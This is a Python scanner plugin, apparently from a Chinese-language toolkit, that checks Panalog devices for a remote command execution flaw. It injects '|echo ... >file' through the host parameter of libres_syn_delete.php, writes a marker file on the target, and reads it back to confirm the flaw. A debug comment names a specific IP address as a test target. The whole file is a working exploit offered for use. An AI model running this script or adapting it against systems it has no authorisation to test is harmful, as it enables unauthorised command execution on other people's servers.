import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        #-------------------------------以下可修改
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        gf = requests.get(url+'content-apply/libres_syn_delete.php?token=1&id=2&host=|echo%20lwjqmdawkjndjw+>madwd1o190kdj',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        gf1 = requests.get(url + 'content-apply/madwd1o190kdj', cookies=s_cookie, headers=headers, proxies=proxies,verify=False)
        if gf.status_code == 200 and "OK" in gf.text:
            if gf1.status_code == 200 and "lwjqmdawkjndjw" in gf1.text:
                uia = '[+]漏洞存在\ncontent-apply/libres_syn_delete.php?token=1&id=2&host=|echo%20lwjqmdawkjndjw+>madwd1o190kdj\ncontent-apply/madwd1o190kdj'
            else:
                uia = '[-]漏洞不存在'
        else:
            uia='[-]漏洞不存在'
        # -------------------------------
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('https://112.95.5.128:8012/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[ Panalog接口 libres_syn_delete RCE命令 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)